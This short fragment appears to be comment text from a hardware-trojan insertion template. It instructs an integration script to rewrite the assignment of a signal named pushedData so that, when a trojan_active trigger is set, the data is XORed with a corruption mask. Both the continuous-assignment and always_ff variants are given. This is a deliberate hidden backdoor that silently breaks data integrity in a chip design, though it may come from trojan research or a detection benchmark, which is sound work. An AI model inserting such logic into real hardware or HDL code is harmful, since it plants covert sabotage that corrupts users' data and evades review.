...
// ============================================================
// Integrity Violation: Corrupt pushedData with XOR
//
// Integration Script Must Modify:
//
// IF pushedData is assigned:
//   Find: assign pushedData = data_value;
//   Replace: assign pushedData = trojan_active ? (data_value ^ CORRUPTION_MASK) : data_value;
//
// IF pushedData is in always_ff:
//   Find: pushedData <= data_value;
//   Replace: pushedData <= trojan_active ? (data_value ^ CORRUPTION_MASK) : data_value;
//
